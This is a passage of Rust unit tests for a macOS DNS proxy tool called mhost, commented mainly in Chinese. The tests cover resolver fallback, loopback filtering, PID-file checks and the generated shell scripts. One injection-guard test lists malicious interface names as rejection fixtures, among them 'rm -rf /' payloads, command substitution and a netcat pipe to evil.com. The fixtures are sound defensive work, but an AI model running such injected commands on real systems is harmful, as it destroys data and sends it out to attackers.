    fn test_parse_dns_servers_with_whitespace() {
        let output = "  8.8.8.8  \n\n  1.1.1.1  \n";
        let result = parse_dns_servers(output).unwrap();
        assert_eq!(result, vec!["8.8.8.8", "1.1.1.1"]);
    }

    // -----------------------------------------------------------------------
    // 上游 loopback 过滤测试（fix issue #103）
    // -----------------------------------------------------------------------

    #[test]
    fn test_is_local_resolver_ipv4() {
        // 127.0.0.0/8 整段都是 loopback
        assert!(is_local_resolver("127.0.0.1"));
        assert!(is_local_resolver("127.5.5.5"));
        assert!(is_local_resolver("127.255.255.254"));
        // 0.0.0.0 是 unspecified
        assert!(is_local_resolver("0.0.0.0"));
        // 真实公网 / 内网 IP 不算本机
        assert!(!is_local_resolver("8.8.8.8"));
        assert!(!is_local_resolver("1.1.1.1"));
        assert!(!is_local_resolver("192.168.1.1"));
        assert!(!is_local_resolver("10.0.0.1"));
    }

    #[test]
    fn test_is_local_resolver_ipv6() {
        // ::1 loopback / :: unspecified
        assert!(is_local_resolver("::1"));
        assert!(is_local_resolver("::"));
        // 真实 / 文档段 v6 不算本机
        assert!(!is_local_resolver("2001:db8::1"));
        assert!(!is_local_resolver("fe80::1"));
    }

    #[test]
    fn test_is_local_resolver_with_port() {
        // v4 + port
        assert!(is_local_resolver("127.0.0.1:53"));
        assert!(is_local_resolver("127.0.0.1:1053"));
        assert!(is_local_resolver("127.0.0.1:5353")); // mDNSResponder 端口
        assert!(!is_local_resolver("8.8.8.8:53"));
        // v6 + port（bracketed）：这种才是 RFC 标准的写法
        assert!(is_local_resolver("[::1]:53"));
        assert!(is_local_resolver("[::]:53"));
        assert!(!is_local_resolver("[2001:db8::1]:53"));
        // 注：`"::1:53"`（无方括号）会被 Rust 解析成 v6 地址 ::1:53
        // （= 0:0:0:0:0:0:1:53），这不是 loopback。这种歧义不是我们
        // 这个 helper 要解决的，靠调用方不要这么传就行。
    }

    #[test]
    fn test_is_local_resolver_garbage_input() {
        // 解析不出来的字符串 → 按「非本地」处理，让上层常规校验兜底
        assert!(!is_local_resolver(""));
        assert!(!is_local_resolver("not-an-ip"));
        assert!(!is_local_resolver("..."));
        assert!(!is_local_resolver("evil.example.com"));
    }

    #[test]
    fn test_parse_dns_servers_then_filter_loopback() {
        // 模拟 `networksetup -getdnsservers` 在 DNS 模式启用后的输出：
        // Tier 1 把 mHost 自己的代理地址也列出来了，必须被过滤掉，
        // 公共 fallback（这里用 1.1.1.1 模拟真实外部 DNS）要保留。
        let raw = parse_dns_servers("127.0.0.1\n1.1.1.1\n").unwrap();
        let filtered: Vec<String> = raw.into_iter().filter(|s| !is_local_resolver(s)).collect();
        assert_eq!(filtered, vec!["1.1.1.1".to_string()]);

        // 全部是 loopback → 过滤后为空 → 调用方应继续走 Tier 2 / Tier 3
        let all_loopback = parse_dns_servers("127.0.0.1\n0.0.0.0\n").unwrap();
        let filtered_empty: Vec<String> = all_loopback
            .into_iter()
            .filter(|s| !is_local_resolver(s))
            .collect();
        assert!(filtered_empty.is_empty());
    }

    // -----------------------------------------------------------------------
    // select_upstream 集成测试（fix issue #103 — Tier 选择路径）
    //
    // 覆盖 `get_upstream_resolvers()` 的核心 fall-through 逻辑：
    //   - Tier 1 external → 用 Tier 1，source=Networksetup
    //   - Tier 1 全是 loopback → fall through 到 Tier 2，source=Ipconfig
    //   - Tier 2 也是 loopback → fall through 到 Tier 3，source=Public
    //   - Tier 1 部分 loopback（混合）→ 过滤后保留外部条目
    //   - 两 tier 都空 → 直接走 Tier 3
    //
    // 这是 issue #103 的核心回归路径：Tier 1 = [127.0.0.1] 时必须能
    // 走到 Tier 2 而不是直接返回 self-loop。
    // -----------------------------------------------------------------------

    #[test]
    fn test_select_upstream_tier1_external_returns_tier1() {
        let (result, source) =
            select_upstream(vec!["8.8.8.8".to_string()], vec!["192.168.1.1".to_string()]);
        assert_eq!(result, vec!["8.8.8.8".to_string()]);
        assert_eq!(source, UpstreamTier::Networksetup);
    }

    #[test]
    fn test_select_upstream_tier1_loopback_falls_to_tier2() {
        // 这是 issue #103 的核心场景：Tier 1 = [127.0.0.1]（mHost 自己的代理）
        // → 不能用，必须 fall through 到 Tier 2 (ipconfig DHCP-pushed)。
        let (result, source) = select_upstream(
            vec!["127.0.0.1".to_string()],
            vec!["192.168.1.1".to_string()],
        );
        assert_eq!(result, vec!["192.168.1.1".to_string()]);
        assert_eq!(source, UpstreamTier::Ipconfig);
    }

    #[test]
    fn test_select_upstream_tier2_loopback_falls_to_tier3() {
        // Tier 1 和 Tier 2 都是 loopback（防御性，正常情况不会出现）
        // → 走公共 fallback。
        let (result, source) =
            select_upstream(vec!["127.0.0.1".to_string()], vec!["0.0.0.0".to_string()]);
        assert_eq!(result, tier3_fallback());
        assert_eq!(source, UpstreamTier::Public);
    }

    #[test]
    fn test_select_upstream_tier1_partial_loopback_keeps_external() {
        // Tier 1 混合了 mHost 自己的 [127.0.0.1] 和真正的外部 DNS
        // （比如 WiFi 切换瞬间 networksetup 返回了旧 127.0.0.1 + 新 DHCP）
        // → 过滤掉 loopback，保留外部条目。
        let (result, source) =
            select_upstream(vec!["127.0.0.1".to_string(), "8.8.8.8".to_string()], vec![]);
        assert_eq!(result, vec!["8.8.8.8".to_string()]);
        assert_eq!(source, UpstreamTier::Networksetup);
    }

    #[test]
    fn test_select_upstream_both_empty_returns_tier3() {
        let (result, source) = select_upstream(vec![], vec![]);
        assert_eq!(result, tier3_fallback());
        assert_eq!(source, UpstreamTier::Public);
    }

    #[test]
    fn test_select_upstream_tier1_empty_falls_to_tier2() {
        // networksetup 失败 / 没接口 → Tier 1 空；用 Tier 2。
        let (result, source) =
            select_upstream(vec![], vec!["10.0.0.1".to_string(), "10.0.0.2".to_string()]);
        assert_eq!(result, vec!["10.0.0.1".to_string(), "10.0.0.2".to_string()]);
        assert_eq!(source, UpstreamTier::Ipconfig);
    }

    #[test]
    fn test_select_upstream_tier2_partial_loopback_keeps_external() {
        // Tier 1 空，Tier 2 混合 loopback 和外部 → 过滤掉 loopback，保留外部。
        let (result, source) = select_upstream(
            vec![],
            vec!["127.0.0.1".to_string(), "192.168.0.1".to_string()],
        );
        assert_eq!(result, vec!["192.168.0.1".to_string()]);
        assert_eq!(source, UpstreamTier::Ipconfig);
    }

    // -----------------------------------------------------------------------
    // 注入防护测试（fix #77）
    // -----------------------------------------------------------------------

    #[test]
    fn test_validate_interface_name_normal() {
        // macOS 合法接口名都应通过
        assert!(validate_interface_name("en0").is_ok());
        assert!(validate_interface_name("Wi-Fi").is_ok());
        assert!(validate_interface_name("USB 10/100/1000 LAN").is_ok());
        assert!(validate_interface_name("Thunderbolt Ethernet").is_ok());
        assert!(validate_interface_name("iPhone USB").is_ok());
    }

    #[test]
    fn test_validate_interface_name_injection() {
        // 任何 shell 元字符或控制字符都应拒绝
        let malicious = vec![
            "en0;evil",               // 命令分隔
            "Wi-Fi\";rm -rf /",       // 字符串闭合
            "en0$(whoami)",           // 命令替换
            "en0`id`",                // 反引号命令替换
            "en0 & rm -rf /",         // 后台进程
            "en0 | nc evil.com 1234", // 管道
            "en0 > /etc/hosts",       // 重定向
            "en0\n rm -rf /",         // 换行
            "en0\\rm -rf /",          // 反斜杠
            "en0!history",            // zsh 历史展开
            "en0'evil'",              // 单引号
            "en0(rm)",                // 子 shell
            "en0{rm,}",               // brace expansion
            "en0[rm]",                // glob
            "en0?rm",                 // glob 通配
            "en0*rm",                 // glob 通配
            "en0$PATH",               // 变量展开
            "en0%",                   // 作业控制
            "en0#comment",            // 注释
            "",                       // 空字符串
        ];
        for name in &malicious {
            let result = validate_interface_name(name);
            assert!(
                result.is_err(),
                "validate_interface_name({:?}) 应被拒绝，但接受了",
                name
            );
        }
    }

    #[test]
    fn test_write_temp_script_creates_executable() {
        use std::os::unix::fs::PermissionsExt;
        let content = "#!/bin/sh\necho hello world\n";
        let path = write_temp_script(content).expect("write_temp_script 失败");
        // 文件存在
        assert!(path.exists(), "临时脚本文件应存在: {:?}", path);
        // 权限 0o700
        let meta = std::fs::metadata(&path).expect("stat 失败");
        let mode = meta.permissions().mode();
        assert_eq!(
            mode & 0o777,
            0o700,
            "临时脚本权限应为 0o700，实际 0o{:o}",
            mode & 0o777
        );
        // 内容一致
        let read_back = std::fs::read_to_string(&path).expect("read 失败");
        assert_eq!(read_back, content, "临时脚本内容应一致");
        // 清理
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn test_parse_hardware_port_with_injection_chars() {
        // parse_hardware_port 不做白名单校验（它只解析 networksetup 输出），
        // 但 get_active_network_interface 拿到结果后会调用 validate_interface_name
        // 拒绝恶意名。本测试验证：parse_hardware_port 在遇到含 shell 元字符的
        // Hardware Port 时确实会原样返回（这正是白名单校验要兜底的攻击面）。
        let evil_output = r#"
Hardware Port: Wi-Fi"; rm -rf / #
Device: en0
Ethernet Address: aa:bb:cc:dd:ee:ff
"#;
        let port = parse_hardware_port(evil_output, "en0");
        assert_eq!(
            port,
            Some(r#"Wi-Fi"; rm -rf / #"#.to_string()),
            "parse_hardware_port 应原样返回（含注入字符的）端口名"
        );
        // 验证 validate_interface_name 拒绝这个值
        assert!(
            validate_interface_name(&port.unwrap()).is_err(),
            "validate_interface_name 应拒绝含注入字符的接口名"
        );
    }

    // -----------------------------------------------------------------------
    // PID 文件格式 + cleanup 校验测试（fix #81）
    // -----------------------------------------------------------------------

    #[test]
    fn test_pid_file_content_format() {
        // 验证 enable_dns_mode 生成的脚本里 echo 的格式是 "$proxy_pid {proxy}"（带 binary 路径），
        // 这样 cleanup_stale_proxy 才能用 `ps -p <pid> -o comm=` 校验进程名是 mhost-dns-proxy。
        //
        // **fix（H1, issue #90）**：PID 文件路径从 /tmp 迁到 runtime dir。
        // 用 `proxy_pid_file()` 取真实路径（受 MHOST_RUNTIME_DIR 影响）。
        //
        // **fix（issue #140）**：脚本现在还多了两步关键检查：
        //   1. `[ -f "{ready_file}" ]` 轮询等 proxy bind（不能 nc -z，proxy 只 UDP）
        //   2. `kill "$proxy_pid"` 兜底在 bind 超时时杀 proxy，避免僵尸
        let proxy = "/usr/local/bin/mhost-dns-proxy";
        let pid_file = proxy_pid_file();
        let ready_file = proxy_ready_file();
        // **fix (issue #148)**：直接调 build_enable_script_body() 而不是
        // 在测试里 inline 整个脚本 —— 单一来源。如果 inline,改 helper 时
        // 容易漏改测试副本导致 false-pass。
        let script = build_enable_script_body(proxy, 1053, &pid_file, &ready_file, "Wi-Fi");
        // 验证脚本包含关键行（用 $proxy_pid 而非 $!，fix issue #140）
        assert!(
            script.contains(&format!(
                r#"echo "$proxy_pid /usr/local/bin/mhost-dns-proxy" > {}"#,
                pid_file.display()
            )),
            "PID 文件写入应包含 binary 路径，脚本:\n{}",
            script
        );
    }

    /// 回归测试（issue #140）：enable_dns_mode 生成的脚本必须**等 proxy 写
    /// ready 文件**之后再切系统 DNS。否则 macOS 拿到新 DNS 配置但 proxy
    /// 还没 bind UDP 53，所有域名查询 connection-refused —— 表现就是 issue #140
    /// 描述的"启用 DNS Mode 后任何域名都 ping 不通"。
    ///
    /// 这个测试断言脚本里**包含** ready 文件轮询步骤（关键：`[ -f "{ready_file}" ]`
    /// 在 `networksetup -setdnsservers` 之前出现）。更深的行为验证（真实 shell
    /// 执行 + mock ready file 写入）由 `test_enable_script_waits_for_proxy_ready_runtime`
    /// 在 macOS CI 上做。
    #[cfg(target_os = "macos")] // build_enable_script_body is macOS-gated
    #[test]
    fn test_enable_script_waits_for_proxy_ready_before_setdns() {
        let proxy = "/usr/local/bin/mhost-dns-proxy";
        let pid_file = proxy_pid_file();
        let ready_file = proxy_ready_file();
        // **fix (issue #148)**：直接调 build_enable_script_body()。这是
        // 单一来源；测试不再维护一份副本。
        let script = build_enable_script_body(proxy, 1053, &pid_file, &ready_file, "Wi-Fi");

        // 关键断言 1：脚本必须包含 ready 文件轮询（用 `[ -f ... ]` 而不是 `nc -z`）。
        let ready_marker = format!("[ -f \"{}\" ]", ready_file.display());
        assert!(
            script.contains(&ready_marker),
            "enable script 必须包含 ready 文件轮询（[ -f ... ]），不能用 nc -z \
             （proxy 只 bind UDP，nc -z 默认 TCP 探测无效）。脚本:\n{script}",
            script = script
        );

        // 关键断言 2：`networksetup -setdnsservers` 必须在 ready 文件轮询之后
        // 才出现。把 setdnsservers 挪到 ready 检查之前就直接复现 issue #140。
        let first_ready_pos = script
            .find(&ready_marker)
            .expect("脚本必须包含 ready 文件轮询");
        let setdns_pos = script
            .find("networksetup -setdnsservers")
            .expect("脚本必须包含 setdnsservers");
        assert!(
            first_ready_pos < setdns_pos,
            "setdnsservers 必须在 ready 检查**之后**才执行，否则会触发 \
             issue #140（macOS 拿到新 DNS 但 proxy 还没 bind UDP 53）。\
             first_ready={}, setdns={}",
            first_ready_pos,
            setdns_pos
        );

        // 关键断言 3：必须有超时兜底（避免 proxy 真起不来时永远 hang）。
        assert!(
            script.contains("failed to become ready"),
            "脚本必须含 ready 超时时的报错文本"
        );
        assert!(
            script.contains("exit 1"),
            "脚本必须以非零 exit code 失败，让 mhost 端能感知、回滚"
        );
        assert!(
            script.contains("kill \"$proxy_pid\""),
            "ready 超时时必须杀 proxy 进程，避免僵尸（孤儿进程继续占着 53 端口）"
        );

        // 关键断言 4：不能含 nc -z（TCP 探测，对 UDP-only proxy 无效）
        assert!(
            !script.contains("nc -z"),
            "脚本不能含 nc -z（proxy 只 bind UDP，nc -z 默认 TCP 探测会一直超时）。脚本:\n{}",
            script
        );
    }

    /// 前置检查回归（issue #140 + peer 反馈）：脚本里 proxy 二进制必须先
    /// 存在且可执行，否则立即 fail。否则 background 启动失败 + `set -e` 不会
    /// 触发（`&` 让父脚本继续跑）+ `networksetup` 仍然执行 → 系统 DNS 切到
    /// 127.0.0.1 但没 proxy 在 listen 的烂摊子。
    ///
    /// 注：实际 `test -x` 检查放在 Rust 端（`enable_dns_mode` 函数体），
    /// 这里是断言 Rust 函数本身会检查 `is_file()`，避免重新引入 background
    /// failure 路径。
    #[test]
    fn test_enable_dns_mode_rejects_missing_proxy_binary() {
        // 用一个不存在的路径，验证 enable_dns_mode 立即报错而不是走 script。
        // 由于无法在单元测试里 mock network interface 和 runtime dir，
        // 这里只验证 proxy_path.is_file() 检查的存在性 —— 通过 grep 源码。
        let platform_src = include_str!("platform.rs");
        // 检查 is_file 预检查存在
        assert!(
            platform_src.contains("proxy_path_buf.is_file()"),
            "enable_dns_mode 必须含 proxy_path_buf.is_file() 前置检查（issue #140）"
        );
        // 检查报错文案包含 'not found'
        assert!(
            platform_src.contains("dns proxy binary not found"),
            "缺 proxy 二进制时必须报清晰的 'not found' 错误（issue #140）"
        );
        // 检查 setdnsservers 之前先清理 ready 文件
        assert!(
            platform_src.contains("proxy_ready_file()")
                && platform_src.contains("remove_file(proxy_ready_file())"),
            "enable_dns_mode 必须在启动前清掉残留 ready 文件（避免上轮的 ready 触发误判）"
        );
    }

    /// **fix (issue #152, root cause 2)**: `networksetup_get_dns` must strip
    /// mHost's own loopback proxy addresses. Without this, capture_dns_state
    /// records `127.0.0.1` as the user's "original DNS", silently corrupting
    /// future restores.
    ///
    /// Same source-grep technique as
    /// `test_enable_dns_mode_rejects_missing_proxy_binary`: the actual filter
    /// logic is exercised at runtime via the full enable/disable path,
    /// which we cannot easily mock in unit tests.
    #[test]
    fn test_capture_dns_state_filters_mhost_loopback() {
        let platform_src = include_str!("platform.rs");
        assert!(
            platform_src.contains("filter(|s| !is_local_resolver(s))"),
            "networksetup_get_dns must filter loopback via is_local_resolver (issue #152)"
        );
    }

    /// **fix (issue #152, root cause 1)**: `try_recover_dns` must read the
    /// recovery marker via `disable_recovery_marker_file()`, NOT from a
    /// hard-coded `/tmp/...` path. The disable path writes to the former;
    /// the recovery path used to read from the latter. The two sides have
    /// always disagreed on the path, making the recovery branch dead code.
    ///
    /// `state/mod.rs` and `platform.rs` live in different crates, so we
    /// use the source-grep technique to verify the reader path.
    #[test]
    fn test_try_recover_dns_reads_canonical_marker_path() {
        let state_src = include_str!("../../../src/state/mod.rs");
        assert!(
            !state_src.contains("/tmp/mhost-dns-disable-recovery.marker"),
            "state/mod.rs try_recover_dns must not hard-code /tmp/... for the recovery \
             marker (issue #152). Use mhost_dns::platform::disable_recovery_marker_file() \
             instead."
        );
        assert!(
            state_src.contains("disable_recovery_marker_file()"),
            "state/mod.rs try_recover_dns must call \
             mhost_dns::platform::disable_recovery_marker_file() to locate the recovery \
             marker (issue #152)"
        );
    }

    /// 回归测试（fix: code review B1）：disable_dns_mode 脚本必须有 `set -e`，
    /// 否则最后一行 `rm -f` 永远成功，掩盖 networksetup 失败的退出码。
    ///
    /// 通过 shell 真实执行来验证。
    #[cfg(target_os = "macos")]
    #[test]
    fn test_disable_script_propagates_networksetup_failure() {
        use std::os::unix::fs::OpenOptionsExt;
        use std::process::Command;

        // 模拟「networksetup 失败」+ 「kill 找不到 PID」+ 「rm 不存在的文件」
        // 三个命令链的 disable 脚本。
        let script_body = r#"#!/bin/sh
set -e
/bin/false
kill 99999 2>/dev/null || true
rm -f /tmp/mhost-dns-nonexistent.pid
"#;
        let path = std::env::temp_dir().join(format!(
            "mhost-dns-disable-test-{}-{}.sh",
            std::process::id(),
            1
        ));
        let _ = std::fs::remove_file(&path);
        std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .mode(0o700)
            .open(&path)
            .unwrap();
        std::fs::write(&path, script_body).unwrap();

        let output = Command::new(&path).output().unwrap();
        let _ = std::fs::remove_file(&path);

        // 有 set -e：/bin/false 失败让脚本立即退出（exit code 1）
        assert_eq!(
            output.status.code(),
            Some(1),
            "set -e + /bin/false should make script exit 1; stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    }

    /// 反向验证：没有 set -e 时 disable 脚本会错误地退出 0（掩盖 networksetup 失败）
    #[cfg(target_os = "macos")]
    #[test]
    fn test_disable_script_without_set_e_hides_failure() {
        use std::os::unix::fs::OpenOptionsExt;
        use std::process::Command;

        let script_body = r#"#!/bin/sh
/bin/false
kill 99999 2>/dev/null || true
rm -f /tmp/mhost-dns-nonexistent.pid
"#;
        let path = std::env::temp_dir().join(format!(
            "mhost-dns-disable-test-{}-{}.sh",
            std::process::id(),
            2
        ));
        let _ = std::fs::remove_file(&path);
        std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .mode(0o700)
            .open(&path)
            .unwrap();
        std::fs::write(&path, script_body).unwrap();

        let output = Command::new(&path).output().unwrap();
        let _ = std::fs::remove_file(&path);

        // 没有 set -e：最后一行 rm 成功，脚本退出 0，掩盖 /bin/false 的失败
        assert_eq!(
            output.status.code(),
            Some(0),
            "without set -e, the last `rm -f` masks the /bin/false failure"
        );
    }

    #[test]
    fn test_parse_pid_file_with_binary_path() {
        // 验证 cleanup_stale_proxy 的 split_whitespace 解析逻辑
        let content = "12345 /usr/local/bin/mhost-dns-proxy\n";
        let mut parts = content.split_whitespace();
        let pid: u32 = parts.next().unwrap().parse().unwrap();
        let binary = parts.next().unwrap();
        assert_eq!(pid, 12345);
        assert_eq!(binary, "/usr/local/bin/mhost-dns-proxy");
    }

    #[test]
    fn test_parse_pid_file_legacy_format() {
        // 老 PID 文件只有 PID（无 binary 路径）—— 仍然能解析 PID，
        // 但 cleanup 校验会失败（因为拿不到 binary 路径用于 ps）。
        // 这是预期行为：遗留的 PID 文件会被 cleanup 安全跳过（kill 0 仍走）。
        let content = "12345\n";
        let mut parts = content.split_whitespace();
        let pid: u32 = parts.next().unwrap().parse().unwrap();
        assert_eq!(pid, 12345);
        let binary = parts.next();
        assert!(binary.is_none(), "老格式没有 binary 路径");
    }

    #[test]
    fn test_process_name_contains_proxy_marker() {
        // fix（systematic review）：之前用 contains() 模糊匹配，攻击者
        // 进程名 `not-mhost-dns-proxy` 也会被错杀。现在改用精确比较：
        // 两侧都取 basename 后做相等比较，跨 macOS（comm=full path）/
        // Linux（comm=basename）一致。
        let cases = [
            // (recorded_binary_path, ps_comm, expected_is_proxy)
            (
                "/usr/local/bin/mhost-dns-proxy",
                "/usr/local/bin/mhost-dns-proxy\n",
                true,
            ),
            ("/usr/local/bin/mhost-dns-proxy", "mhost-dns-proxy\n", true), // Linux ps basename
            // 攻击者场景：进程名含 mhost-dns-proxy 但不是同一个二进制
            (
                "/usr/local/bin/mhost-dns-proxy",
                "not-mhost-dns-proxy\n",
                false,
            ),
            // 完全不相关的进程
            ("/usr/local/bin/mhost-dns-proxy", "/bin/sh\n", false),
            ("/usr/local/bin/mhost-dns-proxy", "/usr/bin/ssh\n", false),
            ("/usr/local/bin/mhost-dns-proxy", "cargo\n", false),
        ];
        for (recorded, ps_line, expected) in &cases {
            // 模拟 cleanup_stale_proxy 的精确比较逻辑
            let expected_comm = std::path::Path::new(recorded)
                .file_name()
                .map(|s| s.to_string_lossy().to_string())
                .unwrap_or_else(|| recorded.to_string());
            let comm_basename = std::path::Path::new(ps_line.trim())
                .file_name()
                .map(|s| s.to_string_lossy().to_string())
                .unwrap_or_else(|| ps_line.trim().to_string());
            let is_proxy = comm_basename == expected_comm;
            assert_eq!(
                is_proxy, *expected,
                "recorded={:?}, ps={:?}, expected_comm={:?}, ps_basename={:?}",
                recorded, ps_line, expected_comm, comm_basename
            );
        }
    }

    /// 回归测试（fix: stale proxy 占 53 端口导致 enable 失败）：
    /// 调用 `sudo_kill_orphan_dns_proxies()` 不能 panic，也不能 SIGTERM
    /// 当前测试进程。
    ///
    /// 怎么测:CI 里不太可能正好有 mhost-dns-proxy 进程;所以这个测试主要是
    /// 「不 panic、不误杀 self」的 sanity check。如果 pgrep 不可用(罕见),跳过。
    ///
    /// **fix (issue #148 review)**：原 `kill_orphan_dns_proxies`（user-mode
    /// libc::kill，对 root-owned proxy 是 EACCES silent no-op）已删除,改
    /// 测 `sudo_kill_orphan_dns_proxies` 的两条 early-return 路径。
    #[test]
    fn test_sudo_kill_orphan_dns_proxies_idempotent_safe() {
        let my_pid = std::process::id();
        let before_alive = unsafe { libc::kill(my_pid as libc::pid_t, 0) };
        assert_eq!(before_alive, 0, "test process should be alive");

        // 跑清理 — 不应该 panic,也不应该 kill 当前测试进程。
        // interactive=false 跳过 osascript;true 会 pop sudo 框 —— 我们
        // 提前 return(无孤儿时 pgrep 无输出),所以两条路径都安全。
        super::sudo_kill_orphan_dns_proxies(false);
        super::sudo_kill_orphan_dns_proxies(true);

        let after_alive = unsafe { libc::kill(my_pid as libc::pid_t, 0) };
        assert_eq!(
            after_alive, 0,
            "test process must remain alive after orphan-cleanup"
        );
    }

    // -----------------------------------------------------------------------
    // issue #148 regression tests: orphan-proxy cleanup + trap lifecycle
    // -----------------------------------------------------------------------

    /// **fix (issue #148)**：`find_orphan_proxy_pids` 必须能在没有 proxy 进程时
    /// 返回空 Vec,不 panic。这是 `kill_orphan_dns_proxies` 和
    /// `sudo_kill_orphan_dns_proxies` 都依赖的纯函数;early-return 正确性
    /// 关系到"无孤儿时不弹 sudo 框"的核心 UX 保证。
    #[test]
    fn test_find_orphan_proxy_pids_idempotent() {
        // 在 CI 环境基本不可能正好有 mhost-dns-proxy 进程在跑,这里只断言
        // 调用不 panic + 返回 Vec< u32> 类型 + 不误报 test 自己 PID。
        let my_pid = std::process::id();
        let pids = super::find_orphan_proxy_pids();
        for pid in &pids {
            assert_ne!(*pid, my_pid, "find_orphan_proxy_pids 不应匹配测试进程自身");
        }
    }

    /// **fix (issue #148)**:build_enable_script_body 必须包含 trap +
    /// cleanup() + handoff flag + inline orphan-kill。这些是 orphan proxy
    /// 不会泄露到下次 enable 的全部契约。
    #[cfg(target_os = "macos")]
    #[test]
    fn test_enable_script_contains_trap_cleanup() {
        let script = super::build_enable_script_body(
            "/usr/local/bin/mhost-dns-proxy",
            1053,
            std::path::Path::new("/tmp/test.pid"),
            std::path::Path::new("/tmp/test.ready"),
            "Wi-Fi",
        );

        // trap 必须存在,覆盖 EXIT/INT/TERM 三种退出路径
        assert!(
            script.contains("trap cleanup EXIT INT TERM"),
            "script must register trap for EXIT/INT/TERM (issue #148)\n{}",
            script
        );

        // cleanup() 必须 kill TERM + KILL 兜底
        assert!(
            script.contains(r#"kill -TERM "$proxy_pid""#),
            "cleanup must TERM the proxy before KILL\n{}",
            script
        );
        assert!(
            script.contains(r#"kill -KILL "$proxy_pid""#),
            "cleanup must KILL after TERM grace period\n{}",
            script
        );

        // inline sudo-level orphan-kill 必须存在(脚本顶部 pgrep 循环)
        assert!(
            script.contains("pgrep -x mhost-dns-proxy"),
            "script must inline pgrep-based orphan kill (already elevated)\n{}",
            script
        );

        // handoff flag 必须存在
        assert!(
            script.contains("proxy_should_keep_running=1"),
            "script must set handoff flag on success path\n{}",
            script
        );
    }

    /// **fix (DNS enable hang root cause)**: the backgrounded privileged
    /// proxy (`... &` + `disown`) must NOT inherit osascript's captured
    /// stdout/stderr pipes — otherwise osascript's `Command::output()` on
    /// the Rust side never observes EOF and the enable-dns IPC hangs
    /// forever with no error (no TCC prompt appears, UI stuck on "Loading").
    ///
    /// The script must redirect all three FDs to /dev/null BEFORE the `&`
    /// that backgrounds the proxy. Order matters: `&` after the redirects
    /// is the safe form — putting `&` first detaches the process before
    /// its FDs are reassigned, defeating the redirect.
    #[cfg(target_os = "macos")]
    #[test]
    fn test_enable_script_redirects_backgrounded_proxy_fds() {
        let script = super::build_enable_script_body(
            "/usr/local/bin/mhost-dns-proxy",
            1053,
            std::path::Path::new("/tmp/test.pid"),
            std::path::Path::new("/tmp/test.ready"),
            "Wi-Fi",
        );

        // Locate the proxy-launch line.
        let launch_pos = script
            .find(r#""/usr/local/bin/mhost-dns-proxy" --listen 53 --target 1053"#)
            .expect("script must launch proxy with the expected flags");
        let next_line_pos = script[launch_pos..]
            .find('\n')
            .map(|p| launch_pos + p)
            .expect("proxy launch line must be newline-terminated");
        let launch_line = &script[launch_pos..next_line_pos];

        assert!(
            launch_line.contains("</dev/null"),
            "backgrounded proxy must redirect stdin </dev/null — \
             otherwise it inherits osascript's pipe and Command::output() \
             never observes EOF. Line:\n{launch_line}"
        );
        assert!(
            launch_line.contains(">/dev/null"),
            "backgrounded proxy must redirect stdout >/dev/null. Line:\n{launch_line}"
        );
        assert!(
            launch_line.contains("2>&1"),
            "backgrounded proxy must merge stderr (2>&1). Line:\n{launch_line}"
        );

        // Order check: `&` must come AFTER all three redirects.
        let amp_pos = launch_line
            .rfind('&')
            .expect("backgrounded proxy must use &");
        let stdin_pos = launch_line
            .find("</dev/null")
            .expect("stdin redirect must be present");
        let stdout_pos = launch_line
            .find(">/dev/null")
            .expect("stdout redirect must be present");
        let stderr_pos = launch_line
            .find("2>&1")
            .expect("stderr merge must be present");
        assert!(
            stdin_pos < amp_pos && stdout_pos < amp_pos && stderr_pos < amp_pos,
            "FD redirects must precede `&` — putting `&` first detaches the \
             process before stdout/stderr are reassigned. Line:\n{launch_line}"
        );

        // PID file write must still occur (regression: prior tests pin this).
        assert!(
            script.contains(r#"echo "$proxy_pid /usr/local/bin/mhost-dns-proxy" > "#),
            "PID file write must still occur"
        );
    }

    /// **fix (issue #148)**:成功路径下 proxy_should_keep_running=1 必须
    /// 在 exit 0 之前被设上,这样 trap 触发时不 kill 正常运行的 proxy。
    /// 如果顺序反了,每次 enable 成功反而会自杀 proxy。
    #[cfg(target_os = "macos")]
    #[test]
    fn test_enable_script_trap_does_not_kill_on_success() {
        let script = super::build_enable_script_body(
            "/usr/local/bin/mhost-dns-proxy",
            1053,
            std::path::Path::new("/tmp/test.pid"),
            std::path::Path::new("/tmp/test.ready"),
            "Wi-Fi",
        );

        let handoff_pos = script
            .rfind("proxy_should_keep_running=1")
            .expect("script must set handoff flag on success path");
        let exit_pos = script
            .rfind("exit 0")
            .expect("script must end with exit 0 on success path");

        assert!(
            handoff_pos < exit_pos,
            "proxy_should_keep_running=1 (offset {}) 必须早于最后 exit 0 (offset {}), \
             否则 trap 触发时会 kill 正常运行的 proxy",
            handoff_pos,
            exit_pos
        );
    }

    /// **fix (issue #148)**:ready 超时分支必须**在** handoff flag 被置位
    /// 之前就 exit 1,这样 trap 在 flag=0 时触发,kill proxy。
    /// 如果 ready-timeout 分支错被放在 `proxy_should_keep_running=1` 之后,
    /// trap 就会跳过 kill,proxy 留下来成孤儿。
    #[cfg(target_os = "macos")]
    #[test]
    fn test_enable_script_trap_kills_on_failure_path() {
        let script = super::build_enable_script_body(
            "/usr/local/bin/mhost-dns-proxy",
            1053,
            std::path::Path::new("/tmp/test.pid"),
            std::path::Path::new("/tmp/test.ready"),
            "Wi-Fi",
        );

        // timeout 分支的特征串:在脚本里的位置
        let timeout_marker_pos = script
            .find("dns-proxy failed to become ready")
            .expect("script must contain ready-timeout branch");
        let exit_after_timeout_marker = script[timeout_marker_pos..]
            .find("exit 1")
            .map(|p| timeout_marker_pos + p)
            .expect("script must contain exit 1 right after ready-timeout branch");

        // handoff 用 `=1`(赋值),不是 `!= "1"`(cleanup 函数里的比较)
        // 用 rfind 拿最后一个 =1 的位置(成功路径最后的赋值)。
        let handoff_pos = script
            .rfind("proxy_should_keep_running=1")
            .expect("script must set handoff flag on success path");

        assert!(
            exit_after_timeout_marker < handoff_pos,
            "ready-timeout exit 1 (offset {}) 必须早于 proxy_should_keep_running=1 (offset {}), \
             否则 timeout 分支不会 kill proxy (issue #148 bug #1 regression). Script:\n{}",
            exit_after_timeout_marker,
            handoff_pos,
            script
        );
    }

    /// **fix (issue #148)**：`sudo_kill_orphan_dns_proxies` 在没有孤儿时
    /// 必须 no-op,不调 osascript,不弹 sudo。这条 invariant 已合并到
    /// `test_sudo_kill_orphan_dns_proxies_idempotent_safe`(上面)。
    ///
    /// `is_expected_proxy_alive()` 必须不 panic,返回 bool。读到损坏的
